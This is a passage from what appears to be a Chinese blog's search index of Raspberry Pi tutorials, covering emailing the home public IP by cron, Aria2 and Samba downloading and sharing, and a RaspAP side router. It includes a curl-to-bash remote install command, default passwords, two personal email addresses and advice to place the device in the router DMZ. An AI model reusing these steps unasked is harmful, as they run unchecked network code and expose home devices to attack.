ea\u5728\u5bb6\u91cc\u4f7f\u7528\uff0c\u9700\u8981\u652f\u6301\u8fdc\u7a0b\u8bbf\u95ee\u3002\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u76ee\u524d\u5bb6\u91cc\u5b89\u88c5\u7684\u90fd\u662f\u8054\u901a\u7684ADSL\uff0c\u516c\u7f51IP\u662f\u7ecf\u5e38\u53d1\u751f\u53d8\u5316\u7684\uff0c\u5982\u4f55\u5b9e\u65f6\u83b7\u53d6\u5bb6\u91cc\u6811\u8393\u6d3e\u7684IP\u5730\u5740\u8fdb\u884c\u8bbf\u95ee\u5462\uff1f \u89e3\u51b3\u529e\u6cd5\u5982\u4e0b\uff1a \u9996\u5148\u767b\u5f55\u5bb6\u91cc\u7684\u8def\u7531\u5668\uff0c\u7ed9\u6811\u8393\u6d3e\u6307\u5b9a\u4e00\u4e2a\u56fa\u5b9a\u7684\u9759\u6001\u5185\u7f51IP\u5730\u5740\u3002 \ufffc \u4f7f\u7528\u8def\u7531\u5668\u91cc\u7684DHCP\u9759\u6001IP\u5206\u914d\u529f\u80fd\u6307\u5b9aIP\u5730\u5740\uff08\u57fa\u672c\u6240\u6709\u8def\u7531\u5668\u90fd\u6709\u8fd9\u4e2a\u529f\u80fd\uff0c\u4f46\u83dc\u5355\u4f4d\u7f6e\u4e0d\u4e00\u6837\uff09 \u8fd9\u91cc\u6211\u8bbe\u7f6e\u4e86192.168.31.88 \u4f5c\u4e3a\u6811\u8393\u6d3e\u7684\u9759\u6001\u5185\u7f51IP\u5730\u5740\u3002 \u7136\u540e\u5f00\u542f\u8def\u7531\u5668\u91cc\u7684DMZ\u529f\u80fd\uff0c\u6307\u5411\u8fd9\u4e2a\u9759\u6001IP\u5730\u5740\uff0c\u8fd9\u6837\u901a\u8fc7\u516c\u7f51IP\u5c31\u80fd\u8bbf\u95ee\u5230\u6811\u8393\u6d3e\u4e86\u3002 \ufffc\ufffc \u90a3\u5982\u4f55\u5b9e\u65f6\u83b7\u53d6\u516c\u7f51\u5730\u5740\u5462\uff1f \u5199\u4e86\u4e0b\u9762\u4e00\u6bb5Python\u4ee3\u7801\uff0c\u5b9e\u73b0\u7684\u65b9\u6cd5\u662f\uff1a \u901a\u8fc7\u8bbf\u95ee\u91c7\u96c6 http://members.3322.org/dyndns/getip \u83b7\u53d6\u5230\u516c\u7f51IP\u5730\u5740\uff0c\u7136\u540e\u501f\u7528163\u90ae\u7bb1\u7ed9\u81ea\u5df1\u7684QQ\u90ae\u7bb1\u53d1\u4fe1\u3002\uff08\u53d1\u4ef6\u548c\u6536\u4ef6\u90ae\u7bb1\u4e00\u81f4\u4e5f\u53ef\u4ee5\uff0c\u4e3b\u8981\u8003\u8651163\u90ae\u7bb1\u8bbe\u7f6eSMTP\u65b9\u4fbf\uff0cQQ\u53ef\u4ee5\u81ea\u52a8\u5f39\u51fa\u90ae\u4ef6\u901a\u77e5\u3002\uff09 #!/usr/bin/python # -*- coding: UTF-8 -*- import smtplib import string from email.MIMEMultipart import MIMEMultipart from email.MIMEText import MIMEText import urllib import urllib2 user_agent = 'Mozilla/4.0 (compatible; MSIE 10.0; Windows NT)' headers = {} headers['User-Agent'] = user_agent url = 'http://members.3322.org/dyndns/getip' # \u901a\u8fc7\u8fd9\u4e2a\u63a5\u53e3\u83b7\u53d6\u516c\u7f51IP\u5730\u5740 req = urllib2.Request(url, headers = headers) res = urllib2.urlopen(req) ip = string.strip(res.read()) # \u53bb\u9664\u7a7a\u683c print ip fromaddr = \"xiangyangqiaomu@163.com\" # \u586b\u5199\u4f60\u7684\u53d1\u4fe1\u90ae\u7bb1\uff0c\u6211\u9009\u7528\u7684\u662f163\u90ae\u7bb1 toaddr = \"85378058@qq.com\" # \u586b\u5199\u4f60\u7684\u6536\u4fe1\u5730\u5740\uff0c\u63a5\u6536\u6811\u8393\u6d3e\u7684\u516c\u7f51IP\u5730\u5740 msg = MIMEMultipart() msg['From'] = fromaddr msg['To'] = toaddr msg['Subject'] = 'rasperberry IP is ' + ip # \u90ae\u4ef6\u6807\u9898 body = 'rasperberry IP is ' + ip # \u90ae\u4ef6\u5185\u5bb9\uff0c\u540c\u6807\u9898\uff08\u5077\u61d2\uff09 msg.attach(MIMEText(body, 'plain')) server = smtplib.SMTP('smtp.163.com', 25) # \u586b\u5199163\u90ae\u7bb1\u7684\u53d1\u4fe1\u670d\u52a1\u5668\u5730\u5740 server.starttls() server.login(fromaddr, \"xxx\") # xxx\u4ee3\u8868\u4f60\u7684\u90ae\u4ef6\u767b\u5f55\u5bc6\u7801 text = msg.as_string() server.sendmail(fromaddr, toaddr, text) # \u5f00\u59cb\u53d1\u90ae\u4ef6 print u\"send ok\" # \u53d1\u9001\u6210\u529f\u63d0\u793a server.quit() \u8fd0\u884c\u8fd9\u4e2apython\u6587\u4ef6\u540e\u5c31\u53d1\u4fe1\u6210\u529f\u4e86\u3002\uff08\u6ce8\u610f\uff0c\u5343\u4e07\u4e0d\u8981\u628a\u8fd9\u4e2apython\u6587\u4ef6\u547d\u540d\u4e3aemail.py\uff0c\u4f1a\u62a5\u9519\uff0c\u6362\u4e2a\u540d\u5b57\uff0c\u6bd4\u5982\u53ebsendemail.py\uff09 \ufffc","title":"\u9047\u5230\u7684\u96be\u70b9\u548c\u89e3\u51b3\u529e\u6cd5"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#_2","text":"\u9700\u8981\u5148\u5199\u4e00\u4e2a\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u811a\u672c\uff0c\u4ee3\u7801\u5982\u4e0b\uff1a #!/bin/sh python /home/pi/code/sendemail.py \u5b58\u4e2a\u540d\u5b57\u53eb getip.sh \u5728\u6811\u8393\u6d3e\u7684\u7ec8\u7aef\u91cc\u8f93\u5165 crontab -e \u8fd9\u4e2a\u662f\u7cfb\u7edf\u81ea\u5e26\u7684\u5b9a\u65f6\u7a0b\u5e8f\uff0c\u5177\u4f53\u7528\u6cd5\u53ef\u4ee5Google \u8fd9\u65f6\u4f1a\u8fdb\u5165\u7f16\u8f91\u754c\u9762\uff0c\u8f93\u5165\u5982\u4e0b\u4ee3\u7801\uff08\u610f\u601d\u662f\u6bcf\u969430\u5206\u949f\u6267\u884c\u4e00\u6b21getip.sh\u8fd9\u4e2a\u811a\u672c\uff09 */30 * * * * /home/pi/code/getip.sh \u8fd9\u6837\uff0c\u6bcf\u969430\u5206\u949f\u4f60\u7684\u90ae\u7bb1\u91cc\u5c31\u4f1a\u6709\u4e00\u5c01\u544a\u77e5\u4f60\u73b0\u5728\u6811\u8393\u6d3e\u516c\u7f51IP\u7684\u90ae\u4ef6\u3002","title":"\u5982\u4f55\u5b9a\u65f6\u8fd0\u884c\u8fd9\u4e2a\u7a0b\u5e8f\u53d1\u90ae\u4ef6\u5462\uff1f"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#_3","text":"\u6709\u4e86\u516c\u7f51IP\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u8fdc\u7a0b\u901a\u8fc7SSH\u767b\u5f55\u5230\u6811\u8393\u6d3e\u4e3b\u673a\u4e86\uff0c\u53ef\u5982\u4f55\u53d8\u6210\u4e0b\u8f7d\u673a\u5462\uff1f \u8fd9\u65f6Linux\u4e0b\u6700\u5f3a\u5927\u7684\u4e0b\u8f7d\u5de5\u5177Aria2\u5c31\u8981\u51fa\u573a\u4e86\u3002 \u636e\u8bf4\u53ef\u4ee5\u4e0b\u8f7d\u767e\u5ea6\u4e91\uff0c\u8fc5\u96f7\u79bb\u7ebf\u4e2d\u7684\u8d44\u6e90\uff0c\u652f\u6301http/https/ftp/bt\u534f\u8bae\uff0c\u652f\u6301metalink 3.0\uff0cmetalink\u662f\u4e00\u79cd\u53ef\u4ee5\u5c06\u4e0d\u540c\u534f\u8bae\u4e0b\u8f7d\u7684\u540c\u4e00\u6587\u4ef6\u96c6\u5408\u5230\u4e00\u8d77\u4ee5\u8fbe\u5230\u6700\u5927\u4e0b\u8f7d\u7a33\u5b9a\u6027\u548c\u901f\u5ea6\u7684\u4e1c\u897f\u3002 \u5b89\u88c5\u914d\u7f6e\u53c2\u8003\u8fd9\u7bc7\u6587\u7ae0\uff1a Raspberry Pi\u4ece\u96f6\u5f00\u59cb\u642d\u5efa\u4f4e\u6210\u672cNAS(7)-Aria2\u8fdc\u7a0b\u4e0b\u8f7d \u6309\u7167\u6b65\u9aa4\u4e00\u6b65\u6b65\u64cd\u4f5c\uff0c\u6bd4\u8f83\u987a\u5229\u3002 \u6700\u540e\u8fd8\u5b89\u88c5\u4e86webui-aria2\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7Web\u754c\u9762\u65b9\u5f0f\u6dfb\u52a0\u4e0b\u8f7d\u4efb\u52a1\u4e86\u3002 \u6ce8\u610f\uff1aWeb\u670d\u52a1\u5668\u53ef\u4ee5\u9009\u62e9Apache\u6216Nginx\u90fd\u53ef\u4ee5\uff0c\u4f46\u914d\u7f6e\u7aef\u53e3\u7684\u65f6\u5019\u4e00\u5b9a\u4e0d\u8981\u752880\u62168080\uff0c\u56e0\u4e3a\u90fd\u88ab\u8054\u901a\u5c01\u6389\u4e86\u3002 \ufffc \u70b9\u51fb\u6dfb\u52a0\u5c31\u53ef\u4ee5\u521b\u5efa\u4e0d\u540c\u534f\u8bae\u7684\u4e0b\u8f7d\u4efb\u52a1\uff0chttp/ftp\u548c\u78c1\u529b\u94fe\u90fd\u9009\u94fe\u63a5\u4e0b\u8f7d\uff0c\u4e5f\u53ef\u4ee5\u4e0a\u4f20BT\u79cd\u5b50\u4e0b\u8f7d\u3002 \u7535\u5f71\u4e0b\u8f7d\u63a8\u8350: LOL\u7535\u5f71\u5929\u5802","title":"\u5982\u4f55\u6539\u9020\u6210\u4e0b\u8f7d\u673a\u5462\uff1f"},{"location":"RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/#_4","text":"\u6811\u8393\u6d3e\u7684\u7cfb\u7edf\u662f\u5b89\u88c5\u5728SD\u5361\u91cc\uff0c\u5bb9\u91cf\u53ea\u670932G\uff0c\u901f\u5ea6\u4e5f\u4e0d\u5feb\u3002\u521a\u597d\u60f3\u8d77\u6765\u6211\u8fd8\u6709\u5757\u95f2\u7f6e\u4e86\u5feb10\u5e74\u7684500G\u79fb\u52a8\u786c\u76d8\u3002 \u770b\u4e86\u5f88\u591a\u6587\u7ae0\u90fd\u8bf4\u6811\u8393\u6d3e\u5e26\u4e0d\u8d77\u6765\u79fb\u52a8\u786c\u76d8\uff0c\u56e0\u4e3a\u7535\u538b\u4e0d\u591f\uff0c\u9700\u8981\u5916\u63a5\u7535\u6e90\u6216\u4f7f\u7528\u5e26\u7535\u6e90\u7684USB Hub\u3002 \u4f46\u6211\u5c1d\u8bd5\u628a\u79fb\u52a8\u786c\u76d8\u63d2\u4e0a\u53bb\u7684\u65f6\u5019\uff0c\u5c45\u7136\u53ef\u4ee5\u8bc6\u522b\u800c\u4e14\u8fd0\u8f6c\u826f\u597d\u3002\u53ef\u80fd\u6811\u8393\u6d3e3b+\u5347\u7ea7\u4e86\uff1f \u53c2\u8003\u6559\u7a0b\u5b89\u88c5\u4e86Samba\u4ee5\u5b9e\u73b0\u6587\u4ef6\u5171\u4eab\uff1a http://www.cnblogs.com/xiaowuyi/p/4051238.html \u6ce8\u610f\u4e8b\u9879\uff1a \u5efa\u8bae\u628a\u79fb\u52a8\u786c\u76d8\u7684\u67d0\u4e2a\u5206\u533a\u683c\u5f0f\u5316\u4e3aext4\u683c\u5f0f\uff0c\u5426\u5219aria2\u4e0b\u8f7d\u65e0\u6cd5\u5199\u5165\u3002 \u5982\u679c\u6709\u5206\u533a\u662fNTFS\u683c\u5f0f\u7684\uff0c\u9700\u8981\u88c5\u8f6f\u4ef6 sudo apt-get install fuse-utils ntfs-3g \u5426\u5219\u5206\u533a\u662f\u53ea\u8bfb\u72b6\u6001\u3002 \u63d2\u4e0a\u53bb\u79fb\u52a8\u786c\u76d8\u6216U\u76d8\u662f\u4e0d\u80fd\u76f4\u63a5\u7528\u7684\uff0c\u9700\u8981\u6302\u8f7d\u3002 \u6559\u7a0b\u5730\u5740 \u5b89\u88c5\u8bbe\u7f6e\u597dSamba\u670d\u52a1\u540e\uff0c\u7535\u8111\u4e5f\u53ef\u4ee5\u8bbf\u95ee\u5230\u79fb\u52a8\u786c\u76d8\u4e86\u3002 \u5982\u679c\u662fMac\u7535\u8111\uff0c\u6253\u5f00Finder -> \u524d\u5f80 -> \u8fde\u63a5\u670d\u52a1\u5668\uff0c\u7136\u540e\u8f93\u5165 smb://user@xxx.xxx.xxx.xxx \u8fd9\u65f6\u4f1a\u8981\u6c42\u8f93\u5165smba\u7528\u6237\u5bc6\u7801\uff0c\u7136\u540e\u5c31\u767b\u5f55\u6210\u529f\u4e86\uff0c\u4ee5\u540e\u8fdc\u7a0b\u5c31\u53ef\u4ee5\u8bbf\u95ee\u81ea\u5df1\u7684\u79fb\u52a8\u786c\u76d8\u4e86\uff0c\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u64ad\u653e\u89c6\u9891\u3002 \u200b \u7f16\u8f91\u4e8e 2016-07-02 01:35 \u6811\u8393\u6d3e\uff08Raspberry Pi\uff09 Python \u5165\u95e8 \u6781\u5ba2\uff08Geek\uff09 \u200b\u8d5e\u540c 682\u200b\u200b62 \u6761\u8bc4\u8bba\u200b\u5206\u4eab\u200b\u559c\u6b22\u200b\u6536\u85cf\u200b\u7533\u8bf7\u8f6c\u8f7d\u200b \u539f\u6587\u94fe\u63a5\uff1a https://zhuanlan.zhihu.com/p/21471896","title":"\u8ba9\u95f2\u7f6e\u7684\u79fb\u52a8\u786c\u76d8\u8dd1\u8d77\u6765"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/","text":"\u4e0a\u7bc7\u6587\u7ae0\u8f76\u54e5\u4ecb\u7ecd\u4e86 \u6811\u8393\u6d3e4\u4f7f\u7528OTG\u529f\u80fd\u53d8\u8eab\u6709\u7ebf\u7f51\u5361 \u7684\u65b9\u6cd5\u3002\u4eca\u5929\u6211\u4eec\u5c31\u6765\u5b9e\u8df5\u8ba9\u6811\u8393\u6d3e4\u53d8\u8eab\u8def\u7531\u5668\u3002\uff08\u7531\u4e8e\u672c\u6587\u7684\u300c\u64cd\u4f5c\u300d\u4e0d\u5177\u5907\u62e8\u53f7\u529f\u80fd\uff0c\u66f4\u9002\u5408\u4f5c\u4e3a\u65c1\u8def\u7531\u4f7f\u7528\u3002\u9700\u8981\u5b9e\u73b0\u62e8\u53f7\u8bf7\u81ea\u884c\u7814\u7a76\u3002\ud83d\ude02\uff09 2020\u5e7407\u670823\u65e5\u66f4\u65b0\uff1a\u6811\u8393\u6d3e\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5OpenWRT\u4f5c\u4e3a\u65c1\u8def\u7531\uff0c\u4f46\u662f\u65e0\u6cd5\u4f7f\u7528OTG\u6709\u7ebf\u7f51\u5361\u8fd9\u4e2a\u529f\u80fd\u3002 \u8ba9\u6811\u8393\u6d3e\u8054\u7f51 \u65e0\u7ebf\uff1a \u4f7f\u7528 raspi-config \uff0c\u8bbe\u7f6e WIFI\u7f51\u7edc \uff0c\u8ba9\u6811\u8393\u6d3e\u8054\u7f51\u3002 \u6709\u7ebf\uff1a \u4f7f\u7528 raspi-config \uff0c\u8bbe\u7f6e WIFI\u7f51\u7edc \u7684\u56fd\u5bb6\uff0c\u4fdd\u5b58\u540e\u6309 Esc \u9000\u51fa\u5b89\u88c5\u754c\u9762\uff0c\u63d2\u5165\u7f51\u7ebf\u3002 \u65e0\u8bba\u9009\u62e9\u4ee5\u4e0a\u4f55\u79cd\u65b9\u5f0f\uff0c\u8bf7\u53c2\u8003 \u6811\u8393\u6d3e4\u4f7f\u7528OTG\u529f\u80fd\u53d8\u8eab\u6709\u7ebf\u7f51\u5361 \u7684\u65b9\u6cd5\u5c06 Type-C\u63a5\u53e3 \u548c\u7535\u8111\u7684 USB\u63a5\u53e3 \u76f8\u8fde\uff0c\u4f7f\u7528 OTG USB \u7f51\u5361\u786e\u4fdd\u6211\u4eec\u5728\u6811\u8393\u6d3e\u4e2d\u9014\u65ad\u7f51\u7684\u60c5\u51b5\u4e0b\u4e5f\u80fd\u901a\u8fc7 ssh root@raspberrypi.local \u7684\u65b9\u5f0f\u8fde\u63a5\u5230\u6811\u8393\u6d3e\u3002 \u8ba9\u6811\u8393\u6d3e\u5177\u5907AP\u529f\u80fd\uff08\u5f00\u70ed\u70b9\uff09 \u5b89\u88c5 RaspAP \uff0c\u8ba9\u6811\u8393\u6d3e\u62e5\u6709\u6f02\u4eae\u7684\u7f51\u7edc\u7ba1\u7406\u754c\u9762\uff1a curl -sL https://install.raspap.com | bash \u5b89\u88c5\u8fc7\u7a0b\u4e2d\u4f1a\u6709\u4e00\u4e9b\u9009\u9879\uff0c\u6839\u636e\u4f60\u7684\u9700\u8981\u6765\u9009\u62e9\u5373\u53ef\uff0c\u65e0\u8bba\u4f5c\u51fa\u4f55\u79cd\u9009\u62e9\u5747\u4e0d\u4f1a\u5f71\u54cd\u6811\u8393\u6d3e\u53d8\u8eab\u4e3a\u65c1\u8def\u7531\u3002 \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u6267\u884c telinit 6 \uff0c\u91cd\u542f\u8bbe\u5907\u3002 \u91cd\u542f\u5b8c\u6210\u5728\u6d4f\u89c8\u5668\u8f93\u5165 http://raspberrypi.local/ \u8bbf\u95ee\u7ba1\u7406\u754c\u9762\uff1a \u7528\u6237\u540d\uff1a admin \u5bc6 \u7801\uff1a secret \u767b\u5f55\u6210\u529f\u540e\u53ef\u4ee5\u770b\u5230\u5f53\u524d\u6811\u8393\u6d3e\u5df2\u7ecf\u5177\u5907WIFI\u70ed\u70b9\u529f\u80fd\u3002 \u5728 RaspAP \u7ba1\u7406\u754c\u9762\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0 WiFi client \u529f\u80fd\u65e0\u6cd5\u6b63\u5e38\u4f7f\u7528\u3002\u8fd9\u662f\u56e0\u4e3a\u76ee\u524d\u6211\u4eec\u7684AP\u5de5\u4f5c\u65b9\u5f0f\u662f eth0 \u63a5\u5165\uff0c wlan0 \u53d1\u51fa\u70ed\u70b9\u4fe1\u53f7\u3002 \u8fd9\u65f6\uff0c\u5982\u679c\u63d2\u5165\u7684\u662f\u6709\u7ebf\u7f51\u7edc\uff0c\u5176\u5b83\u8bbe\u5907\u641c\u7d22\u540d\u79f0\u4e3a raspi-webgui \u7684WIFI\uff0c\u8f93\u5165\u9ed8\u8ba4\u5bc6\u7801 ChangeMe \u5373\u53ef\u4e0a\u7f51\u3002\u8fd0\u884c\u6a21\u5f0f\u5982\u4e0a\u56fe\u3002 \u8ba9USB OTG\u7f51\u5361\u4e5f\u80fd\u4e0a\u7f51 \u5f53\u524d\u7684 USB OTG \u7f51\u5361\u4ecd\u7136\u662f 169.254.x.x \u4e00\u7c7b\u7684\u5730\u5740\uff0c\u662f\u65e0\u6cd5\u8fde\u63a5\u7f51\u7edc\u7684\u3002 \u7f16\u8f91 /etc/dhcpcd.conf \uff0c\u5728\u6700\u672b\u5c3e\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a # OTG USB usb0 configuration interface usb0 static ip_address=192.168.130.1/24 static domain_name_server= \u751f\u6210 /etc/dnsmasq.d/usb0.conf \u6587\u4ef6\uff0c\u6dfb\u52a0\u5982\u4e0b\u914d\u7f6e\uff1a interface=usb0 dhcp-range=192.168.130.100,192.168.130.255,255.255.255.0,12h \u91cd\u542f dhcpcd \u548c dnsmasq \u670d\u52a1\u3002 sudo systemctl daemon-reload sudo systemctl restart dhcpcd sudo systemctl restart dnsmasq \u901a\u8fc7 ifconfig \u547d\u4ee4\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230 usb0 \u7f51\u5361\u62e5\u6709\u4e86 192.168.130.1 \u8fd9\u4e2aIP\u5730\u5740\uff0c\u540c\u65f6\u4e0e\u4e4b\u76f8\u8fde\u7684\u7535\u8111\u4e5f\u83b7\u53d6\u5230\u4e86\u8be5\u7f51\u6bb5\u7684IP\u5730\u5740\u3002 \u5982\u679c\u73b0\u5728\u5c06\u7f51\u7ebf\u63d2\u5165\u5230\u6811\u8393\u6d3e\u6709\u7ebf\u7f51\u5361\uff0c\u5219 USB OTG \u7f51\u5361\u4e5f\u53ef\u4ee5\u4e0a\u7f51\u4e86\u3002\u867d\u7136 usb0 \u4e0e wlan0 \u4e0d\u5728\u540c\u4e00\u7f51\u6bb5\uff0c\u4f46\u662f\u4ed6\u4eec\u4e4b\u95f4\u7684\u8bbe\u5907\u662f\u53ef\u4ee5\u4e92\u76f8\u8bbf\u95ee\u7684\u3002\u6b64\u65f6\u7684\u8fd0\u884c\u6a21\u5f0f\u5982\u4e0b\uff1a \u8ba9\u6811\u8393\u6d3e\u5177\u5907\u65e0\u7ebf\u63a5\u5165\u529f\u80fd \u73b0\u5728\u6211\u4eec\u77e5\u9053\u5982\u4f55\u5c06\u6709\u7ebf\u7f51\u7edc\u5171\u4eab\u4e3a\u65e0\u7ebfWIFI\u4fe1\u53f7\u5e76\u5206\u4eab\u7ed9 USB OTG\u7f51\u5361 \u4f7f\u7528\u3002\u4e0d\u8fc7\u5f88\u591a\u65f6\u5019\u6211\u4eec\u5e76\u6ca1\u6709\u6709\u7ebf\u7f51\u7edc\u63a5\u5165\u7684\u6761\u4ef6\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u65e0\u7ebf\u7f51\u7edc\u63a5\u5165\uff08\u672c\u6587\u91c7\u7528 \u5916\u63a5USB\u7f51\u5361 \u7684\u65b9\u5f0f\u5b9e\u73b0\uff09\uff0c\u7136\u540e\u5206\u4eab\u7ed9\u6709\u7ebf\u7f51\u5361 eth0 \u3001\u65e0\u7ebf\u70ed\u70b9 wlan0 \u3001OTG USB\u7f51\u5361 usb0 \u3002\u4e0d\u8fc7\uff0c\u7531\u4e8e\u65e0\u7ebf\u7f51\u7edc\u63a5\u5165\u901f\u7387\u8f83\u4f4e\uff0c\u4fdd\u7559\u6709\u9650\u7f51\u5361 eth0 \u4f5c\u4e3a\u63a5\u5165\u7f51\u53e3\uff08 WAN \u53e3\uff09\u66f4\u5177\u6709\u73b0\u5b9e\u610f\u4e49\uff0c\u56e0\u6b64\u672c\u6587\u4e0d\u518d\u63cf\u8ff0\u5982\u4f55\u5c06\u5176\u53d8\u4e3a LAN \u53e3\uff0c\u611f\u5174\u8da3\u7684\u5c0f\u4f19\u4f34\u53ef\u4ee5\u81ea\u5df1\u7814\u7a76\u7814\u7a76\u3002 \u6211\u4eec\u5e0c\u671b\u6811\u8393\u6d3e\u5177\u5907\u4e0b\u56fe\u7684\u8fd0\u884c\u6a21\u5f0f\uff1a \u6211\u4f7f\u7528\u5177\u5907\u53cc\u9891WIFI\u7684\u7f51\u4ef6AC6210\u7f51\u5361\uff0c\u5728\u6811\u8393\u6d3e\u4e0b\u514d\u9a71\u3002 \u63d2\u5165 USB\u65e0\u7ebf\u7f51\u5361 \uff0c\u6267\u884c ifconfig -a \u786e\u8ba4\u9a71\u52a8\u5b89\u88c5\u6b63\u5e38\uff0c\u786e\u8ba4\u7f51\u5361\u7f16\u53f7\u662f wlan1 \u3002\u5982\u4e0d\u51fa\u610f\u5916\uff0c\u7f51\u5361\u4f1a\u81ea\u52a8\u8fde\u4e0a\u4e4b\u524d\u8fde\u63a5\u8fc7\u7684WIFI\u3002 \u5c06 /var/www/html/includes/config.php \u6587\u4ef6\u4e2d\u7684 define('RASPI_WIFI_CLIENT_INTERFACE', 'wlan0') \u6539\u4e3a define('RASPI_WIFI_CLIENT_INTERFACE', 'wlan1') \u4fee\u6539 /etc/dhcpcd.conf \u6587\u4ef6\uff0c\u5728 wlan0 \uff08\u6ce8\u610f\u662f\u677f\u8f7d\u7f51\u5361 wlan0 \uff09\u7684\u914d\u7f6e\u6700\u540e\u9762\u52a0\u4e0a nohook wpa_supplicant \u3002\u4f8b\u5982\uff1a # RaspAP wlan0 configuration interface wlan0 static ip_address=10.3.141.1/24 static routers=10.3.141.1 static domain_name_server=9.9.9.9 1.1.1.1 nohook wpa_supplicant \u6700\u540e\u91cd\u542f hostapd \uff1a sudo systemctl restart hostapd.service \u5982\u4e00\u5207\u6b63\u5e38\uff0c\u5219 USB OTG \u7f51\u5361\u4ee5\u53caWIFI\u70ed\u70b9\u5747\u53ef\u6b63\u5e38\u8bbf\u95ee\u7f51\u7edc\u3002 \u5f53\u7136\uff0c\u4e5f\u6709\u5c0f\u4f19\u4f34\u53d1\u73b0\u65e0\u6cd5\u4e0a\u7f51\uff0c\u6392\u67e5\u65b9\u5f0f\u5982\u4e0b\uff1a route \u67e5\u770b\u5f53\u524d\u8bbe\u5907\u8def\u7531\u8868\u3002\u7ed3\u679c\u53ef\u80fd\u548c\u4e0b\u8ff0\u76f8\u4f3c\uff1a root@raspberrypi:~# route Kernel IP routing table Destination Gateway Genmask Flags Metric Ref Use Iface default 10.3.141.1 0.0.0.0 UG 304 0 0 wlan0 default OpenWrt.lan 0.0.0.0 UG 305 0 0 wlan1 10.3.141.0 0.0.0.0 255.255.255.0 U 304 0 0 wlan0 192.168.100.0 0.0.0.0 255.255.255.0 U 305 0 0 wlan1 192.168.130.0 0.0.0.0 255.255.255.0 U 203 0 0 usb0 \u8fd9\u662f\u7531\u4e8e\u9ed8\u8ba4\u7f51\u5173\u4f18\u5148\u7ea7\u4e0d\u591f\u5bfc\u81f4\u65e0\u6cd5\u6b63\u5e38\u4e0a\u7f51\u3002 route add default gw \u6b63\u786e\u7684\u7f51\u5173\u5730\u5740 \u4fee\u6539\u540e\u5373\u53ef\u6b63\u5e38\u4e0a\u7f51\u3002 \u540c\u7406\uff0c\u6709\u7ebf\u7f51\u53e3 eth0 \u548cUSB\u65e0\u7ebf\u7f51\u5361 wlan1 \u90fd\u53ef\u4ee5\u4f5c\u4e3a WAN \u53e3\u63a5\u5165\u7f51\u7edc\uff0c\u800c\u5177\u4f53\u60f3\u9009\u62e9\u8c01\u6765\u4e0a\u7f51\uff0c\u53ea\u9700\u8981\u8c03\u6574\u8def\u7531\u7684\u4f18\u5148\u7ea7\u5373\u53ef\u3002 \u6309\u7167\u8f76\u54e5\u63d0\u4f9b\u7684\u4fee\u6539\u65b9\u6cd5\uff0c RaspAP \u539f\u672c\u7684\u529f\u80fd\u4e0d\u4f1a\u53d7\u5230\u5f71\u54cd\uff0c\u800c\u4e14\u9996\u9875\u8fd8\u80fd\u663e\u793a wlan1 \u7684\u4fe1\u606f\uff0c\u53ef\u4ee5\u53ef\u89c6\u5316\u914d\u7f6e wlan1 \u63a5\u5165\u7684\u65e0\u7ebf\u7f51\u7edc\uff0c\u662f\u4e0d\u662f\u5f88\u9177\u5462\uff1f\ud83d\ude0e","title":"\u6811\u8393\u6d3e4\u53d8\u8eab\u65c1\u8def\u7531"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/#_1","text":"\u65e0\u7ebf\uff1a \u4f7f\u7528 raspi-config \uff0c\u8bbe\u7f6e WIFI\u7f51\u7edc \uff0c\u8ba9\u6811\u8393\u6d3e\u8054\u7f51\u3002 \u6709\u7ebf\uff1a \u4f7f\u7528 raspi-config \uff0c\u8bbe\u7f6e WIFI\u7f51\u7edc \u7684\u56fd\u5bb6\uff0c\u4fdd\u5b58\u540e\u6309 Esc \u9000\u51fa\u5b89\u88c5\u754c\u9762\uff0c\u63d2\u5165\u7f51\u7ebf\u3002 \u65e0\u8bba\u9009\u62e9\u4ee5\u4e0a\u4f55\u79cd\u65b9\u5f0f\uff0c\u8bf7\u53c2\u8003 \u6811\u8393\u6d3e4\u4f7f\u7528OTG\u529f\u80fd\u53d8\u8eab\u6709\u7ebf\u7f51\u5361 \u7684\u65b9\u6cd5\u5c06 Type-C\u63a5\u53e3 \u548c\u7535\u8111\u7684 USB\u63a5\u53e3 \u76f8\u8fde\uff0c\u4f7f\u7528 OTG USB \u7f51\u5361\u786e\u4fdd\u6211\u4eec\u5728\u6811\u8393\u6d3e\u4e2d\u9014\u65ad\u7f51\u7684\u60c5\u51b5\u4e0b\u4e5f\u80fd\u901a\u8fc7 ssh root@raspberrypi.local 